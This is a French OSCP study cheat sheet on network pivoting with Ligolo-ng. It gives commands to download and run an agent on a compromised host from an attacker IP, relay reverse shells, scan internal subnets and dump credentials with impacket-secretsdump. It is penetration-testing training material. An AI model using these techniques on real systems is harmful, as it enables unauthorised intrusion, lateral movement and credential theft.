# 🐛 Ligolo-ng — Fiche OSCP (pivot AD)

> **Objectif** : depuis ton Kali, atteindre des sous-réseaux internes que tu ne peux pas router directement, en passant par une machine compromise (le "pivot"). Aucun `proxychains`, tu utilises tes outils Kali (nmap, crackmapexec, evil-winrm, impacket, rdp...) comme si tu étais dans le réseau.

---

## 🧠 Concept en 30 secondes

```
[Kali attaquant]  <---TLS--->  [Machine compromise (agent)]  --->  [Réseau interne]
   (proxy)                          (agent Ligolo)                (ex: 172.16.1.0/24)
```

- **Proxy** = tourne sur ton Kali (c’est *toi* qui écoutes).
- **Agent** = binaire déposé sur la machine compromise, il se **connecte à ton Kali** (reverse).
- Le proxy expose une **interface TUN** locale. Tu ajoutes une route vers le sous-réseau cible → n'importe quel outil Kali passe par le tunnel.

⚠️ Contre-intuitif au début : c'est l'agent qui se connecte à toi, pas l'inverse. Donc **ton port doit être joignable** depuis la cible.

---

## 📦 Préparation (une fois pour toutes sur ton Kali)

Télécharge les 2 binaires depuis https://github.com/nicocha30/ligolo-ng/releases :
- `ligolo-ng_proxy_X.Y.Z_linux_amd64.tar.gz` → **pour toi (Kali)**
- `ligolo-ng_agent_X.Y.Z_windows_amd64.zip` → **pour la cible Windows**
- `ligolo-ng_agent_X.Y.Z_linux_amd64.tar.gz` → **pour la cible Linux**

Range-les dans `~/tools/ligolo/` pour les avoir sous la main le jour J.

---

## 🚀 Setup côté Kali (proxy)

### 1. Créer l'interface TUN (à faire à chaque redémarrage)

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

Vérif : `ip a show ligolo` → tu dois voir une interface `ligolo` UP.

### 2. Lancer le proxy

```bash
./proxy -selfcert
```

- `-selfcert` : génère un cert TLS auto-signé (l'agent utilisera `-ignore-cert`).
- Port par défaut : **11601/tcp**. Ouvre-le si tu as un firewall local.

Tu tombes dans le shell interactif `ligolo-ng »`.

---

## 🎯 Setup côté cible (agent)

### Transfert du binaire

Selon ce que tu as sur la cible :

**Windows** (depuis un shell sur la cible) :
```powershell
# Depuis Kali, sers le fichier
python3 -m http.server 8000

# Depuis la cible
certutil -urlcache -f http://KALI_IP:8000/agent.exe C:\Windows\Temp\agent.exe
# ou
iwr http://KALI_IP:8000/agent.exe -o C:\Windows\Temp\agent.exe
```

**Linux** :
```bash
wget http://KALI_IP:8000/agent -O /tmp/agent && chmod +x /tmp/agent
```

### Lancement de l'agent

```bash
# Windows
C:\Windows\Temp\agent.exe -connect KALI_IP:11601 -ignore-cert

# Linux
/tmp/agent -connect KALI_IP:11601 -ignore-cert
```

Côté proxy tu verras un truc du genre :
```
INFO[0042] Agent joined.  name=DESKTOP-XXX@10.10.10.5 remote="..."
```

---

## 🎛️ Commandes proxy essentielles

Dans le shell `ligolo-ng »` :

| Commande | Effet |
|---|---|
| `session` | Liste les agents connectés, en sélectionne un |
| `ifconfig` | Affiche les interfaces réseau de l'agent (⭐ **repère les sous-réseaux à router**) |
| `autoroute` | Détecte les sous-réseaux et configure routes + interface tout seul (**le plus simple**) |
| `start` / `tunnel_start` | Démarre le tunnel pour la session courante |
| `stop` | Stoppe le tunnel |
| `listener_add` | Crée un listener sur l'agent (utile pour double pivot & reverse shells, voir plus bas) |
| `listener_list` / `listener_del` | Gérer les listeners |

---

## 🛣️ Ajouter les routes (méthode manuelle)

Une fois la session sélectionnée et le tunnel démarré, **dans un autre terminal Kali** :

```bash
# Exemple : la machine pivot a une interface sur 172.16.1.0/24
sudo ip route add 172.16.1.0/24 dev ligolo
```

Vérif :
```bash
ip route | grep ligolo
ping 172.16.1.10   # devrait passer via ligolo
```

À partir de là, **tous tes outils Kali fonctionnent nativement** :
```bash
nmap -sT -Pn -p 445,3389,88 172.16.1.0/24     # -sT obligatoire (TCP connect), pas de SYN scan à travers TUN
crackmapexec smb 172.16.1.0/24
evil-winrm -i 172.16.1.10 -u user -p 'pass'
impacket-secretsdump user:'pass'@172.16.1.10
xfreerdp /v:172.16.1.10 /u:user /p:'pass'
```

> 🔑 **Piège nmap classique** : à travers Ligolo, utilise `-sT` (TCP connect scan), pas `-sS`. Le TUN userland ne supporte pas les scans SYN bruts.

---

## 🪆 Double pivot (typique AD OSCP)

Scénario :
```
[Kali] → [Pivot1 (Linux/Win)] → [Pivot2] → [DC dans 10.10.30.0/24]
```

Le pivot1 voit un sous-réseau qui contient le pivot2, mais pas le DC. Une fois que tu compromets le pivot2, tu ne peux **pas** déployer un agent qui se connecte directement à ton Kali (le pivot2 n'a pas de route vers toi). Solution : **le pivot1 relaie**.

### 1. Sur le pivot1, dans sa session Ligolo, crée un listener

```
ligolo-ng » session         # sélectionne pivot1
[Agent : pivot1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

Traduction : "le pivot1 écoute sur son propre `0.0.0.0:11601` et forwarde vers ton proxy Kali (via le tunnel existant)".

### 2. Dépose et lance l'agent sur le pivot2, mais en pointant vers pivot1

```bash
./agent -connect IP_PIVOT1:11601 -ignore-cert
```

Une nouvelle session apparaît dans ton proxy. 🎉

### 3. Deuxième interface TUN + routes

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up
```

Dans le proxy :
```
ligolo-ng » session         # sélectionne pivot2
[Agent : pivot2] » ifconfig
[Agent : pivot2] » start --tun ligolo2
```

Puis sur Kali :
```bash
sudo ip route add 10.10.30.0/24 dev ligolo2
```

Et voilà, tu attaques le DC comme si de rien n'était.

> 💡 `autoroute` gère aussi ce cas et te propose de créer une nouvelle interface — teste-le en labo pour voir si tu préfères.

---

## 🐚 Reverse shells à travers Ligolo

Ton listener Kali (`nc -lvnp 4444`) n'est **pas joignable** depuis le réseau interne. Tu dois faire écouter le pivot et forwarder vers toi.

Dans la session de l'agent qui a accès au réseau où sera exécuté ton payload :
```
[Agent : pivot1] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```

Puis sur Kali :
```bash
nc -lvnp 4444
```

Ton payload sur la machine interne pointe alors vers `IP_PIVOT1:4444`. La reverse shell traverse Ligolo jusqu'à toi.

Idem pour un relais SMB, un HTTP callback pour PetitPotam, etc.

---

## 🧯 Troubleshooting rapide

| Symptôme | Cause probable |
|---|---|
| `Agent joined` mais rien ne route | Tu as oublié `sudo ip route add ... dev ligolo` |
| `Operation not permitted` sur `ip tuntap` | Manque `sudo` ou l'user n'est pas propriétaire du TUN |
| Nmap ne renvoie rien à travers le tunnel | Utilise `-sT -Pn`, pas `-sS` |
| L'agent ne se connecte pas | Firewall Windows sur ton Kali, ou mauvais port ; teste avec `nc -lvnp 11601` en parallèle |
| Tunnel se coupe tout le temps | Instabilité réseau — relance l'agent avec un `while true; do ./agent ...; sleep 5; done` |
| `read: connection reset by peer` | L'agent est mort (crash, session RDP fermée, etc.) — redéploie |
| Le double pivot ne marche pas | Vérifie que le `listener_add` est bien sur pivot1 et que pivot2 pointe vers l'IP **interne** de pivot1 |

---

## ✅ Checklist express jour J

- [ ] Binaires `proxy` + `agent` (Windows & Linux) prêts dans un dossier
- [ ] `sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up`
- [ ] `./proxy -selfcert` lancé
- [ ] Agent déployé et connecté → `session` → `ifconfig` → repérer les subnets
- [ ] `start` puis `sudo ip route add SUBNET dev ligolo`
- [ ] Test : `ping` une IP interne connue
- [ ] Documenter dans le report : screenshots de `ifconfig` de l'agent + `ip route` + preuve de connectivité

---

## 📚 Sources utiles

- Repo officiel : https://github.com/nicocha30/ligolo-ng
- Wiki : https://ligolo-ng.readthedocs.io
- Notes OSCP communautaires : https://github.com/dollarboysushil/oscp-cpts-notes

Bonne chance pour l'exam 🍀 — Try Harder!
